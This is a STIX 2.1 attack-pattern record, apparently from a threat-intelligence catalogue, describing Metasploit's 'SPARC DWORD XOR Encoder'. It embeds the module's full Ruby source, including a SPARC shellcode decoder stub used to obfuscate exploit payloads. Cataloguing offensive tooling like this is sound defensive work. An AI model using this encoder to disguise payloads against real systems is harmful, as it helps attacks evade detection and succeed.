{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24e2abbe-4675-4103-8e0e-d5ed9e4e6085",
    "created": "2024-08-14T16:33:19.204898Z",
    "modified": "2024-08-14T16:33:19.204902Z",
    "name": "SPARC DWORD XOR Encoder",
    "description": " This encoder is optyx's 48-byte SPARC encoder with some tweaks. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/sparc/longxor_tag.rb",
            "external_id": "longxor_tag.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::XorAdditiveFeedback\n\n  def initialize\n    super(\n      'Name'             => 'SPARC DWORD XOR Encoder',\n      'Description'      => %q{\n        This encoder is optyx's 48-byte SPARC encoder with some tweaks.\n      },\n      'Author'           => [ 'optyx', 'hdm' ],\n      'Arch'             => ARCH_SPARC,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'KeySize'    => 4,\n          'BlockSize'  => 4,\n          'KeyPack'    => 'N',\n        })\n  end\n\n  #\n  # Returns the decoder stub\n  #\n  def decoder_stub(state)\n    Rex::Arch::Sparc.set_dword(state.key, 'l1') +\n    \"\\x20\\xbf\\xff\\xff\" +   # bn,a  _start - 4\n    \"\\x20\\xbf\\xff\\xff\" +   # bn,a  _start\n    \"\\x7f\\xff\\xff\\xff\" +   # call  _start + 4\n    \"\\xea\\x03\\xe0\\x20\" +   # ld    [%o7 + 0x20],%l7\n    \"\\xaa\\x9d\\x40\\x11\" +   # xorcc %l5,%l1,%l5\n    \"\\xea\\x23\\xe0\\x20\" +   # st    %l5,[%o7 + 0x20]\n    \"\\xa2\\x04\\x40\\x15\" +   # add   %l1,%l5,%l1\n    \"\\x81\\xdb\\xe0\\x20\" +   # flush %o7 + 0x20\n    \"\\x12\\xbf\\xff\\xfb\" +   # bnz   dec_loop\n    \"\\x9e\\x03\\xe0\\x04\"     # add   %o7,4,%o7\n  end\n\n  #\n  # Append the decoder key now that we're done\n  #\n  def encode_end(state)\n    state.encoded += [ state.key.to_i ].pack('N')\n  end\n\n  #\n  # Verify that the chosen key doesn't become an invalid byte due to\n  # the set_dword() result (22/10 bit split)\n  #\n  def find_key_verify(buf, key_bytes, badchars)\n    return ( has_badchars?(\n      Rex::Arch::Sparc.set_dword(key_bytes_to_integer(key_bytes), 'l1'),\n      badchars\n    ) ? false : true)\n  end\nend\n"
}